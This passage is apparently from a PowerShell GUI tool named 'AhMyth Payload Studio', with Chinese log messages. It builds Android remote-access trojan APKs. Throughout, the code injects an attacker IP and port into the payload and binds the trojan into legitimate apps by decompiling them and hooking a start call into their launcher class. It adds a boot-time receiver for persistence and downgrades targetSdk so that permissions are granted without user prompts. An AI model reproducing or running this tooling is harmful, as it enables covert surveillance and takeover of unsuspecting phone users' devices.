        if (-not $mm.Success) { throw 'AndroidManifest.xml 中找不到 <application> 节点' }
        $xml = $xml.Substring(0, $mm.Index) + $block + $xml.Substring($mm.Index)
        [System.IO.File]::WriteAllText($ManifestPath, $xml, [System.Text.UTF8Encoding]::new($false))
    }
    return @{ Existing = $existing.Count; Added = $toAdd.Count; Total = ($existing.Count + $toAdd.Count) }
}

function Add-ManifestPayloadTags {
    # Appends the AhMyth <service> and <receiver> right before </application>.
    param([Parameter(Mandatory)][string]$ManifestPath)
    $xml = [System.IO.File]::ReadAllText($ManifestPath)
    $ns  = Get-AndroidNsPrefix $xml
    if ($xml -match [regex]::Escape('ahmyth.mine.king.ahmyth.MyReceiver')) { return $false }
    $tags = @(
        ('    <receiver {0}:name="ahmyth.mine.king.ahmyth.MyReceiver" {0}:enabled="true" {0}:exported="true">' -f $ns),
        '        <intent-filter>',
        ('            <action {0}:name="android.intent.action.BOOT_COMPLETED"/>' -f $ns),
        '        </intent-filter>',
        '    </receiver>',
        ('    <service {0}:name="ahmyth.mine.king.ahmyth.MainService" {0}:enabled="true" {0}:exported="false" {0}:foregroundServiceType="specialUse">' -f $ns),
        ('        <property {0}:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" {0}:value="background sync"/>' -f $ns),
        '    </service>'
    )
    $block = (($tags -join "`r`n") + "`r`n")
    $closes = [regex]::Matches($xml, '</application\s*>')
    if ($closes.Count -eq 0) { throw 'AndroidManifest.xml 中找不到 </application> 节点' }
    $idx = $closes[$closes.Count - 1].Index
    $xml = $xml.Substring(0, $idx) + $block + $xml.Substring($idx)
    [System.IO.File]::WriteAllText($ManifestPath, $xml, [System.Text.UTF8Encoding]::new($false))
    return $true
}
#endregion

#region ---------- build dispatch ----------
function Invoke-StandaloneBuild {
    param([hashtable]$Cfg)
    $Cfg = ConvertTo-CfgTable $Cfg

    $factory = Resolve-Factory
    $jdk     = Resolve-Jdk $Cfg.JdkPath
    if (-not $factory -or -not $jdk) { Write-Log '[x] 环境不完整，无法出包' 'FAIL'; return $false }
    $java   = Join-Path $jdk 'bin\java.exe'
    $src    = Join-Path $factory 'Ahmyth'
    $build  = Join-Path $script:WorkRoot 'buildSrc'
    $outDir = if ($Cfg.OutDir) { $Cfg.OutDir } else { Join-Path $script:WorkRoot 'Output' }

    if (-not (Test-Path -LiteralPath $script:WorkRoot)) { New-Item -ItemType Directory -Path $script:WorkRoot -Force | Out-Null }

    # isolate JDK 11 for child processes only; restored afterwards
    $savedJavaHome = $env:JAVA_HOME
    $savedPath     = $env:PATH
    $env:JAVA_HOME = $jdk
    $env:PATH      = (Join-Path $jdk 'bin') + ';' + $env:PATH

    try {
        Write-Log '[1/5] 复制载荷模板到 ASCII 工作目录...' 'STEP'
        Initialize-WorkCopy -SourceDir $src -TargetDir $build
        Write-Log ('[OK] 工作目录: ' + $build) 'OK'

        Write-Log '[2/5] 注入连接地址...' 'STEP'
        if (-not (Set-SmaliEndpoint -BuildDir $build -Ip $Cfg.IP -Port $Cfg.PORT)) {
            Write-Log '[x] 注入连接地址失败（原因见上一行）' 'FAIL'; return $false
        }

        Write-Log '[3/5] 注入权限...' 'STEP'
        $perms = Get-SelectedPermissions
        $n = Set-ManifestPermissions -BuildDir $build -Permissions $perms
        Write-Log ('[OK] AndroidManifest.xml 写入 {0} 条 uses-permission / uses-feature' -f $n) 'OK'

        Write-Log '[4/5] apktool 打包中（可能需要 10-40 秒）...' 'STEP'
        $apk = Join-Path $build 'Ahmyth.apk'
        if (Test-Path -LiteralPath $apk) { [System.IO.File]::Delete($apk) }
        $rb = Invoke-ApktoolBuild -Factory $factory -Java $java -ApkFolder $build -OutApk $apk
        if (-not $rb.Ok) {
            Write-Log '[x] apktool 打包失败' 'FAIL'
            Write-Log (Get-LogTail $rb.Log 15) 'FAIL'
            return $false
        }
        Write-Log ('[OK] 打包完成 (apktool {0} / {1}): {2:N0} bytes' -f $rb.Version, $rb.Tool, (Get-Item -LiteralPath $apk).Length) 'OK'

        Write-Log '[5/5] 签名中...' 'STEP'
        $r2 = Invoke-JavaTool -JavaExe $java -WorkingDirectory $factory -StageName 'sign' `
                -JavaArgs @('-jar', (Join-Path $factory 'sign.jar'), '-a', $apk)
        $signed = Join-Path $build 'Ahmyth-aligned-debugSigned.apk'
        if (-not (Test-Path -LiteralPath $signed)) {
            Write-Log '[x] 签名失败：未生成已签名 APK' 'FAIL'
            Write-Log (Get-LogTail ($r2.StdErr + "`r`n" + $r2.StdOut) 15) 'FAIL'
            return $false
        }

        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        $safeIp = ($Cfg.IP -replace '[^0-9A-Za-z\.\-]', '_')
        $final  = Join-Path $outDir ('Ahmyth_{0}_{1}.apk' -f $safeIp, $Cfg.PORT)
        Copy-Item -LiteralPath $signed -Destination $final -Force

        Write-Log ''
        Write-Log '[OK] Payload 构建成功' 'OK'
        Write-Log ('[i] 输出: ' + $final) 'OK'
        Write-Log ('[i] 大小: {0:N0} bytes' -f (Get-Item -LiteralPath $final).Length) 'INFO'
        Write-Log ('[i] 连接目标: http://{0}:{1}' -f $Cfg.IP, $Cfg.PORT) 'INFO'
        $script:LastOutput = $final
        return $true
    }
    finally {
        $env:JAVA_HOME = $savedJavaHome
        $env:PATH      = $savedPath
    }
}

function Write-Step {
    # Numbered progress line; the denominator depends on the bind method (7 = BOOT, 9 = ACTIVITY).
    param([Parameter(Mandatory)][string]$Message)
    $script:StepNo++
    Write-Log ('[{0}/{1}] {2}' -f $script:StepNo, $script:StepTotal, $Message) 'STEP'
}

function Get-SimpleClassName {
    # com.foo.MainActivity -> MainActivity ; .MainActivity -> MainActivity
    param([string]$Fqcn)
    if ([string]::IsNullOrWhiteSpace($Fqcn)) { return '' }
    return ($Fqcn.Trim().Split('.')[-1])
}

function Find-SmaliFileByName {
    # Returns the full path of <SimpleName>.smali, searching dex groups in load order
    # (smali = classes.dex first, then smali_classes2 = classes2.dex, ...).
    param([Parameter(Mandatory)][string]$ApkFolder, [Parameter(Mandatory)][string]$SimpleName)
    if (-not $SimpleName) { return '' }
    $file = $SimpleName + '.smali'
    $dirs = @(Get-ChildItem -LiteralPath $ApkFolder -Directory -Force -ErrorAction SilentlyContinue |
              Where-Object { $_.Name -eq 'smali' -or $_.Name -match '^smali_classes\d+$' } |
              Sort-Object { if ($_.Name -eq 'smali') { 1 } else { [int]($_.Name -replace '^smali_classes', '') } })
    foreach ($d in $dirs) {
        $hit = Get-ChildItem -LiteralPath $d.FullName -Recurse -Filter $file -File -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($hit) { return $hit.FullName }
    }
    return ''
}

function Get-SmaliHookCandidates {
    # Mirrors AppCtrl.js getLauncherActivity() candidate order:
    #   1) <application android:name>  2) launcher <activity>  3) <activity-alias> targetActivity
    param([Parameter(Mandatory)][string]$Xml)
    $out = New-Object 'System.Collections.Generic.List[string]'

    $appTag = [regex]::Match($Xml, '<application\b[^>]*')
    if ($appTag.Success) {
        $m = [regex]::Match($appTag.Value, 'android:name\s*=\s*"([^"]+)"')
        if ($m.Success -and $m.Groups[1].Value -notlike 'android.app*') { $out.Add((Get-SimpleClassName $m.Groups[1].Value)) }
    }

    # <activity(?![-A-Za-z0-9_.]) keeps <activity-alias ...> out of this branch
    foreach ($mm in [regex]::Matches($Xml, '<activity(?![-A-Za-z0-9_.])[\s\S]*?</activity\s*>|<activity(?![-A-Za-z0-9_.])[^>]*/>')) {
        if ($mm.Value -notmatch 'android\.intent\.action\.MAIN') { continue }
        if ($mm.Value -notmatch 'android\.intent\.category\.(LAUNCHER|DEFAULT)') { continue }
        $nm = [regex]::Match($mm.Value, 'android:name\s*=\s*"([^"]+)"')
        if ($nm.Success) { $out.Add((Get-SimpleClassName $nm.Groups[1].Value)) }
    }

    foreach ($mm in [regex]::Matches($Xml, '<activity-alias(?![-A-Za-z0-9_.])[\s\S]*?</activity-alias\s*>')) {
        if ($mm.Value -notmatch 'android\.intent\.action\.MAIN') { continue }
        if ($mm.Value -notmatch 'android\.intent\.category\.(LAUNCHER|DEFAULT)') { continue }
        $nm = [regex]::Match($mm.Value, 'android:targetActivity\s*=\s*"([^"]+)"')
        if ($nm.Success) { $out.Add((Get-SimpleClassName $nm.Groups[1].Value)) }
    }

    return @($out | Where-Object { $_ } | Select-Object -Unique)
}

function Resolve-SmaliHookTarget {
    # Upstream bug fixed: the Application class no longer blocks the launcher-activity fallback
    # when its smali file is missing - every candidate is verified on disk before being used.
    param([Parameter(Mandatory)][string]$Xml, [Parameter(Mandatory)][string]$ApkFolder)
    foreach ($c in (Get-SmaliHookCandidates -Xml $Xml)) {
        $p = Find-SmaliFileByName -ApkFolder $ApkFolder -SimpleName $c
        if ($p) { return @{ Class = $c; Path = $p } }
    }
    return $null
}

function Add-SmaliHook {
    # Injects MainService.start() into the hook class.
    # Primary : right after the .locals/.registers prologue of onCreate() - runs on every launch,
    #           immune to early-return branches inside onCreate.
    # Fallback : upstream parity - replace the first 'return-void' in the file.
    param([Parameter(Mandatory)][string]$SmaliPath)
    $invoke = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V'
    $text = [System.IO.File]::ReadAllText($SmaliPath)
    if ($text.Contains($invoke)) { return @{ Hooked = $true; Where = 'already-injected' } }

    $nl = if ($text -match "`r`n") { "`r`n" } else { "`n" }
    $lines = $text -split "`r?`n"

    $onCreate = -1
    for ($i = 0; $i -lt $lines.Count; $i++) {
        if ($lines[$i].StartsWith('.method') -and $lines[$i] -match '\sonCreate\(') { $onCreate = $i; break }
    }
    if ($onCreate -ge 0) {
        for ($j = $onCreate + 1; $j -lt $lines.Count; $j++) {
            if ($lines[$j] -match '^\s*\.(locals|registers)\s+\d+') {
                $before = @($lines[0..$j])
                $after  = if ($j + 1 -le $lines.Count - 1) { @($lines[($j + 1)..($lines.Count - 1)]) } else { @() }
                $new = $before + @('', ('    ' + $invoke)) + $after
                [System.IO.File]::WriteAllText($SmaliPath, ($new -join $nl), [System.Text.UTF8Encoding]::new($false))
                return @{ Hooked = $true; Where = 'onCreate-prologue' }
            }
        }
    }

    $idx = $text.IndexOf('return-void')
    if ($idx -lt 0) { return @{ Hooked = $false; Where = 'no-return-void-in-file' } }
    $updated = $text.Substring(0, $idx) + $invoke + $nl + $nl + '    return-void' + $text.Substring($idx + 11)
    [System.IO.File]::WriteAllText($SmaliPath, $updated, [System.Text.UTF8Encoding]::new($false))
    return @{ Hooked = $true; Where = 'first-return-void' }
}

function Set-ManifestSdk {
    # Upstream AppCtrl.js behaviour: force the decoded manifest down to compileSdk 22 / codename 11
    # so the injected permissions are granted at install time (targetSdk <= 22 => no runtime prompts).
    param([Parameter(Mandatory)][string]$ManifestPath)
    $xml = [System.IO.File]::ReadAllText($ManifestPath)
    $xml = [regex]::Replace($xml, '\b(compileSdkVersion\s*=\s*")\d{1,2}"',        '${1}22"')
    $xml = [regex]::Replace($xml, '\b(compileSdkVersionCodename\s*=\s*")\d{1,2}"','${1}11"')
    $xml = [regex]::Replace($xml, '\b(platformBuildVersionCode\s*=\s*")\d{1,2}"', '${1}22"')
    $xml = [regex]::Replace($xml, '\b(platformBuildVersionName\s*=\s*")\d{1,2}"', '${1}11"')
    [System.IO.File]::WriteAllText($ManifestPath, $xml, [System.Text.UTF8Encoding]::new($false))
}

function Set-ApktoolYmlSdk {
    # Upstream parity: minSdkVersion -> 19, targetSdkVersion -> 22 (see Set-ManifestSdk).
    # Returns the previous values so a failed build can restore minSdk: forcing minSdk to 19 makes
    # aapt2 reject resources that need a newer API level (e.g. <adaptive-icon>, API 26).
    param(
        [Parameter(Mandatory)][string]$YmlPath,
        [int]$MinSdk = 19,
        [int]$TargetSdk = 22
    )
    $t = [System.IO.File]::ReadAllText($YmlPath)
    $orig = @{ Min = 0; Target = 0 }
    $m = [regex]::Match($t, "\bminSdkVersion:\s*'?(\d+)'?")
    if ($m.Success) { $orig.Min = [int]$m.Groups[1].Value }
    $m = [regex]::Match($t, "\btargetSdkVersion:\s*'?(\d+)'?")
    if ($m.Success) { $orig.Target = [int]$m.Groups[1].Value }
    # apktool <= 2.x writes 'quoted' sdk values, 3.x writes bare ints - normalise both to bare.
    $t = [regex]::Replace($t, "\b(minSdkVersion:\s*)'?\d{1,2}'?",    ('${1}' + $MinSdk))
    $t = [regex]::Replace($t, "\b(targetSdkVersion:\s*)'?\d{1,2}'?", ('${1}' + $TargetSdk))
    [System.IO.File]::WriteAllText($YmlPath, $t, [System.Text.UTF8Encoding]::new($false))
    return $orig
}
function Get-ApktoolVersion {
    # Queried once per session (one extra JVM start) and cached in $script:ApktoolVersion.
    param([Parameter(Mandatory)][string]$Factory, [Parameter(Mandatory)][string]$Java)
    if ($script:ApktoolVersion) { return $script:ApktoolVersion }
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $out = (& $Java -jar (Join-Path $Factory 'apktool.jar') --version 2>&1 | Out-String)
        $script:ApktoolVersion = (($out -split "`r?`n" | Where-Object { $_.Trim() } | Select-Object -First 1) -replace '^\D+', '').Trim()
    }
    catch { $script:ApktoolVersion = '' }
    finally { $ErrorActionPreference = $prev }
    return $script:ApktoolVersion
}

function Invoke-ApktoolBuild {
    # apktool changed its resource-compiler flags twice, so the attempt list is derived from the
    # installed jar instead of being hardcoded:
    #   <= 2.7   : aapt1 is the default, --use-aapt2 opts into aapt2
    #   2.8-2.12 : aapt2 is the default, --use-aapt1 opts back into the legacy toolchain
    #   >= 3.0   : aapt2 only, both flags were removed upstream
    # The plain attempt always runs first, which covers every version.
    param(
        [Parameter(Mandatory)][string]$Factory,
        [Parameter(Mandatory)][string]$Java,
        [Parameter(Mandatory)][string]$ApkFolder,
        [Parameter(Mandatory)][string]$OutApk
    )
    $apktool = Join-Path $Factory 'apktool.jar'
    $ver = Get-ApktoolVersion -Factory $Factory -Java $Java
    $major = 0; $minor = 0
    if ($ver -match '^(\d+)\.(\d+)') { $major = [int]$Matches[1]; $minor = [int]$Matches[2] }

    $attempts = @(@{ Name = 'aapt2'; Args = @('-jar', $apktool, 'b', $ApkFolder, '-o', $OutApk) })
    if ($major -eq 2 -and $minor -le 7) {
        # legacy jar: the plain attempt above is aapt1, so try aapt2 first
        $attempts = @(@{ Name = 'aapt2'; Args = @('-jar', $apktool, 'b', $ApkFolder, '-o', $OutApk, '--use-aapt2') }) + $attempts
    }
    elseif ($major -eq 2) {
        $attempts += @{ Name = 'aapt1'; Args = @('-jar', $apktool, 'b', $ApkFolder, '-o', $OutApk, '--use-aapt1') }
    }

    $lastLog = ''
    foreach ($a in $attempts) {
        if (Test-Path -LiteralPath $OutApk) { [System.IO.File]::Delete($OutApk) }
        $stale = Join-Path $ApkFolder 'build'
        if (Test-Path -LiteralPath $stale) { [System.IO.Directory]::Delete($stale, $true) }
        $r = Invoke-JavaTool -JavaExe $Java -WorkingDirectory $Factory -StageName ('build-' + $a.Name) -JavaArgs $a.Args
        $lastLog = ($r.StdErr + "`r`n" + $r.StdOut)
        if ($r.Code -eq 0 -and (Test-Path -LiteralPath $OutApk)) {
            return @{ Ok = $true; Tool = $a.Name; Log = $lastLog; Version = $ver }
        }
        Write-Log ('[!] {0} 打包失败，尝试下一个资源编译器...' -f $a.Name) 'WARN'
    }
    return @{ Ok = $false; Tool = ''; Log = $lastLog; Version = $ver }
}
function Invoke-BindBuild {
    param([hashtable]$Cfg)
    $Cfg = ConvertTo-CfgTable $Cfg

    $factory = Resolve-Factory
    $jdk     = Resolve-Jdk $Cfg.JdkPath
    if (-not $factory -or -not $jdk) { Write-Log '[x] 环境不完整，无法出包' 'FAIL'; return $false }

    $targetApk = $Cfg.BindApk
    if ([string]::IsNullOrWhiteSpace($targetApk)) { Write-Log '[x] bind 模式必须先在「目标 APK」里选择要绑定的 APK' 'FAIL'; return $false }
    if (-not (Test-Path -LiteralPath $targetApk)) { Write-Log ('[x] 目标 APK 不存在: ' + $targetApk) 'FAIL'; return $false }

    $isActivity = ($Cfg.Method -eq 'ACTIVITY')
    $java      = Join-Path $jdk 'bin\java.exe'
    $apktool   = Join-Path $factory 'apktool.jar'
    $signJar   = Join-Path $factory 'sign.jar'
    $payload   = Join-Path $script:WorkRoot 'bindPayload'
    $apkFolder = Join-Path $script:WorkRoot 'bindApp'
    $stageApk  = Join-Path $script:WorkRoot 'bind-source.apk'
    $builtApk  = Join-Path $script:WorkRoot 'Bound-output.apk'
    $signedApk = Join-Path $script:WorkRoot 'Bound-output-aligned-debugSigned.apk'
    $outDir    = if ($Cfg.OutDir) { $Cfg.OutDir } else { Join-Path $script:WorkRoot 'Output' }

    $script:StepNo    = 0
    $script:StepTotal = if ($isActivity) { 10 } else { 9 }
    $sdkOrig = @{ Min = 0; Target = 0 }

    if (-not (Test-Path -LiteralPath $script:WorkRoot)) { New-Item -ItemType Directory -Path $script:WorkRoot -Force | Out-Null }

    # isolate JDK 11 for child processes only; restored afterwards
    $savedJavaHome = $env:JAVA_HOME
    $savedPath     = $env:PATH
    $env:JAVA_HOME = $jdk
    $env:PATH      = (Join-Path $jdk 'bin') + ';' + $env:PATH

    try {
        Write-Step '复制载荷模板到 ASCII 工作目录...'
        Initialize-WorkCopy -SourceDir (Join-Path $factory 'Ahmyth') -TargetDir $payload
        if (-not (Set-SmaliEndpoint -BuildDir $payload -Ip $Cfg.IP -Port $Cfg.PORT)) {
            Write-Log '[x] 注入连接地址失败（原因见上一行）' 'FAIL'; return $false
        }

        Write-Step '反编译目标 APK（大应用可能要 1-3 分钟，日志会停一会）...'
        Copy-Item -LiteralPath $targetApk -Destination $stageApk -Force
        if (Test-Path -LiteralPath $apkFolder) { [System.IO.Directory]::Delete($apkFolder, $true) }
        $decodeArgs = @('-jar', $apktool, 'd', $stageApk, '-f', '-o', $apkFolder)
        $r = Invoke-JavaTool -JavaExe $java -WorkingDirectory $factory -StageName 'decode' -JavaArgs $decodeArgs
        $manifest = Join-Path $apkFolder 'AndroidManifest.xml'
        if ($r.Code -ne 0 -or -not (Test-Path -LiteralPath $manifest)) {
            Write-Log '[x] 反编译失败：未生成 AndroidManifest.xml' 'FAIL'
            Write-Log (Get-LogTail ($r.StdErr + "`r`n" + $r.StdOut) 15) 'FAIL'
            return $false
        }
        Write-Log ('[OK] 反编译完成: ' + $apkFolder) 'OK'

        Write-Step '增量追加权限（保留目标 App 原有权限）...'
        $perms = Get-SelectedPermissions
        $pi = Add-ManifestPermissions -ManifestPath $manifest -Permissions $perms
        Write-Log ('[OK] 原有 {0} 条 -> 新增 {1} 条 -> 合计 {2} 条' -f $pi.Existing, $pi.Added, $pi.Total) 'OK'

        Write-Step '注入 MainService / MyReceiver 到 manifest...'
        if (Add-ManifestPayloadTags -ManifestPath $manifest) { Write-Log '[OK] receiver(BOOT_COMPLETED) + service(FGS:specialUse) 已写入' 'OK' }
        else { Write-Log '[!] manifest 已存在 AhMyth 组件，跳过（可能重复绑定过）' 'WARN' }
        $fgs = Add-ManifestPermissions -ManifestPath $manifest -Permissions @('android.permission.FOREGROUND_SERVICE','android.permission.FOREGROUND_SERVICE_SPECIAL_USE')
        if ($fgs.Added -gt 0) { Write-Log '[OK] 补前台服务权限 FOREGROUND_SERVICE / FOREGROUND_SERVICE_SPECIAL_USE（Android 14+ 必需）' 'OK' }

        # BOOT 也注入 App 启动触发（双触发：开机广播 + 打开 App 都能拉起载荷）；只有 ACTIVITY 才降 SDK
        Write-Step '定位 Hook 类（Application -> launcher Activity -> activity-alias）...'
        $xml = [System.IO.File]::ReadAllText($manifest)
        $hookTarget = Resolve-SmaliHookTarget -Xml $xml -ApkFolder $apkFolder
        if ($hookTarget) {
            $rel = $hookTarget.Path
            if ($rel.StartsWith($apkFolder, [System.StringComparison]::OrdinalIgnoreCase)) { $rel = $rel.Substring($apkFolder.Length).TrimStart('\', '/') }
            Write-Log ('[OK] Hook 目标: {0} -> {1}' -f $hookTarget.Class, $rel) 'OK'
        } elseif ($isActivity) {
            Write-Log '[x] 找不到可 Hook 的启动类 smali（Application / launcher Activity / alias 都不存在）' 'FAIL'
            Write-Log '[i] 这个 APK 请改用 BOOT 方法，或换一个目标 APK' 'INFO'
            return $false
        } else {
            Write-Log '[!] 找不到可 Hook 的启动类，跳过「打开 App 触发」，只保留开机 BOOT_COMPLETED' 'WARN'
        }

        Write-Step '注入 MainService;->start()V 到 Hook 类...'
        if ($hookTarget) {
            $hook = Add-SmaliHook -SmaliPath $hookTarget.Path
            if (-not $hook.Hooked) { Write-Log ('[x] 注入失败: ' + $hook.Where) 'FAIL'; return $false }
            Write-Log ('[OK] 注入点: {0}' -f $hook.Where) 'OK'
        } else {
            Write-Log '[¡] 已跳过（见上一步警告）' 'INFO'
        }

        if ($isActivity) {
            Write-Step '降级 SDK（compileSdk 22 / minSdk 19 / targetSdk 22）...'
            Set-ManifestSdk -ManifestPath $manifest
            $yml = Join-Path $apkFolder 'apktool.yml'
            if (Test-Path -LiteralPath $yml) { $sdkOrig = Set-ApktoolYmlSdk -YmlPath $yml }
            Write-Log '[OK] 已写入，目标 App 的运行时权限弹窗将被绕过（与原版 GUI 行为一致）' 'OK'
        }

        Write-Step '拷贝载荷 smali 到独立 dex 组...'
        $smaliDir = Get-NextSmaliDirName -Dir $apkFolder
        $target   = Join-Path $apkFolder $smaliDir
        Copy-DirectoryMerge -Source (Join-Path $payload 'smali') -Destination $target
        # android / androidx must be merged into the main smali folder so aapt2 links them
        foreach ($sub in @('android', 'androidx')) {
            $from = Join-Path $target $sub
            if (Test-Path -LiteralPath $from) {
                Copy-DirectoryMerge -Source $from -Destination (Join-Path $apkFolder ('smali\' + $sub))
                [System.IO.Directory]::Delete($from, $true)
            }
        }
        $cnt = (Get-ChildItem -LiteralPath $target -Recurse -Filter *.smali -File | Measure-Object).Count
        Write-Log ('[OK] {0} 个 smali 已写入 {1}（android/androidx 已并入主 smali）' -f $cnt, $smaliDir) 'OK'

        Write-Step 'apktool 打包中...'
        if (Test-Path -LiteralPath $builtApk) { [System.IO.File]::Delete($builtApk) }
        $rb = Invoke-ApktoolBuild -Factory $factory -Java $java -ApkFolder $apkFolder -OutApk $builtApk
        if (-not $rb.Ok -and $isActivity -and $sdkOrig.Min -gt 19) {
            # Forcing minSdk to 19 makes aapt2 reject resources that need a newer API level
            # (e.g. <adaptive-icon>, API 26). targetSdk 22 is what grants the permissions at
            # install time, so keep it and put the original minSdk back instead.
            Write-Log ('[!] 打包失败，可能是 minSdk 被强制降到 19 导致；恢复原 minSdk {0} 后重试...' -f $sdkOrig.Min) 'WARN'
            if (Test-Path -LiteralPath $yml) { [void](Set-ApktoolYmlSdk -YmlPath $yml -MinSdk $sdkOrig.Min -TargetSdk 22) }
            $rb = Invoke-ApktoolBuild -Factory $factory -Java $java -ApkFolder $apkFolder -OutApk $builtApk
        }
        if (-not $rb.Ok) {
            Write-Log '[x] 打包失败（资源编译器两种配置都没过）' 'FAIL'
            Write-Log (Get-LogTail $rb.Log 20) 'FAIL'
            Write-Log '[i] 提示：见上方 aapt2 报错。可换一个目标 APK，或回退 Factory\apktool.jar（备份在 AhMyth-Payload-Studio\_backup\）' 'INFO'
            return $false
        }
        if ($rb.Tool -eq 'aapt1') { Write-Log '[!] aapt2 不兼容该资源，已用 aapt1 兜底' 'WARN' }
        Write-Log ('[OK] 打包完成 (apktool {0} / {1}): {2:N0} bytes' -f $rb.Version, $rb.Tool, (Get-Item -LiteralPath $builtApk).Length) 'OK'

        Write-Step '签名中...'
        if (Test-Path -LiteralPath $signedApk) { [System.IO.File]::Delete($signedApk) }
        $signArgs = @('-jar', $signJar, '-a', $builtApk)
        $r3 = Invoke-JavaTool -JavaExe $java -WorkingDirectory $factory -StageName 'sign' -JavaArgs $signArgs
        if (-not (Test-Path -LiteralPath $signedApk)) {
            Write-Log '[x] 签名失败：未生成已签名 APK' 'FAIL'
            Write-Log (Get-LogTail ($r3.StdErr + "`r`n" + $r3.StdOut) 15) 'FAIL'
            return $false
        }

        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        $safeIp   = ($Cfg.IP -replace '[^0-9A-Za-z\.\-]', '_')
        $safeBase = ([System.IO.Path]::GetFileNameWithoutExtension($targetApk) -replace '[^\w\.\-]', '_')
        $final = Join-Path $outDir ('Bound_{0}_{1}_{2}_{3}.apk' -f $safeBase, $Cfg.Method, $safeIp, $Cfg.PORT)
        Copy-Item -LiteralPath $signedApk -Destination $final -Force

        Write-Log ''
        Write-Log '[OK] 绑定出包成功' 'OK'
        Write-Log ('[i] 输出: ' + $final) 'OK'
        Write-Log ('[i] 大小: {0:N0} bytes' -f (Get-Item -LiteralPath $final).Length) 'INFO'
        Write-Log ('[i] 连接目标: http://{0}:{1}' -f $Cfg.IP, $Cfg.PORT) 'INFO'
        Write-Log ('[i] 方法: {0}' -f $Cfg.Method) 'INFO'
        if ($isActivity) {
            Write-Log '[i] 启动时机: 打开 App 时由 Hook 类触发（已降到 targetSdk 22，权限安装即生效）' 'INFO'
        } else {
            Write-Log '[i] 启动时机: 开机 BOOT_COMPLETED 或打开 App 都会触发（保持原 targetSdk，权限走系统正常流程）' 'INFO'
        }
        $script:LastOutput = $final
        return $true
    }
    finally {
        $env:JAVA_HOME = $savedJavaHome
        $env:PATH      = $savedPath
    }
}
function Invoke-Build {
    $cfg = ConvertTo-CfgTable (Get-CfgFromUi)
    $script:Cfg = $cfg
    $script:LogBox.Clear()
    Write-Log '════ AhMyth Payload Studio ════' 'STEP'
    Write-Log '[i] IP/端口/权限/路径全部运行时读取，无写死' 'INFO'
    Write-Log ''

    if (-not (Invoke-Preflight $cfg)) { $statusLabel.Text = '预检失败'; return }

    $ok = if ($cfg.Mode -eq 'standalone') { Invoke-StandaloneBuild $cfg } else { Invoke-BindBuild $cfg }
    $statusLabel.Text = if ($ok) { '出包成功' } else { '出包失败（见日志）' }
}
#endregion

#region ---------- events ----------
$rbStandalone.Add_CheckedChanged({ Update-Enabled })
$rbBind.Add_CheckedChanged({ Update-Enabled })

$btnBrowse.Add_Click({
    $dlg = New-Object System.Windows.Forms.OpenFileDialog
    $dlg.Title = '选择要绑定的 APK'
    $dlg.Filter = 'Android APK (*.apk)|*.apk|所有文件 (*.*)|*.*'
    if ($tbApk.Text -and (Test-Path -LiteralPath (Split-Path -Parent $tbApk.Text))) {
        $dlg.InitialDirectory = Split-Path -Parent $tbApk.Text
    }
    if ($dlg.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) { $tbApk.Text = $dlg.FileName }
    $dlg.Dispose()
})

$btnSave.Add_Click({
    $cfg = ConvertTo-CfgTable (Get-CfgFromUi)
    Write-ConfigFile $cfg
    $script:Cfg = $cfg
    Write-Log ('[✓] 配置已写入: ' + $script:CfgFile) 'OK'
    $statusLabel.Text = '配置已保存'
})

$btnOut.Add_Click({
    $out = $script:Cfg.OutDir
    if (-not $out) { $out = Join-Path $script:WorkRoot 'Output' }
    if (-not (Test-Path -LiteralPath $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
    Start-Process explorer.exe $out
})

$btnClear.Add_Click({ $script:LogBox.Clear() })

$btnBuild.Add_Click({
    try { Invoke-Build }
    catch {
        Write-Log ('[x] 未处理异常: ' + $_.Exception.Message) 'FAIL'
        Write-Log ('[x] 异常类型: ' + $_.Exception.GetType().FullName) 'FAIL'
        $inv = $_.InvocationInfo
        if ($inv -and $inv.ScriptLineNumber) {
            Write-Log ('[x] 位置: 第 {0} 行 | {1}' -f $inv.ScriptLineNumber, ([string]$inv.Line).Trim()) 'FAIL'
        }
        $statusLabel.Text = '异常'
    }
})

$form.Add_Shown({
    Hide-ConsoleWindow
    # The launcher starts us with SW_HIDE so no terminal window flashes; force the form back.
    try { [void][ConsoleHost]::ShowWindow($form.Handle, 5) } catch { }
    Write-Log '════ AhMyth Payload Studio ════' 'STEP'
    Write-Log ('[i] 运行环境: PowerShell ' + $PSVersionTable.PSVersion.ToString() + ' (' + $PSVersionTable.PSEdition + ')') 'INFO'
    Write-Log '[★] 已就绪：standalone / bind BOOT（开机+打开App 双触发）/ bind ACTIVITY（降 targetSdk，权限安装即生效）' 'OK'
    Write-Log ('[¡] 配置文件: ' + $script:CfgFile) 'INFO'
    Write-Log '[i] 点「生成 Payload」开始构建（先跑预检，再出包）' 'INFO'
    Write-Log ''
})
#endregion

#region ---------- boot ----------
$script:Cfg = Read-Config
Load-UiFromCfg $script:Cfg
Update-Enabled
[void]$form.ShowDialog()
$form.Dispose()
#endregion
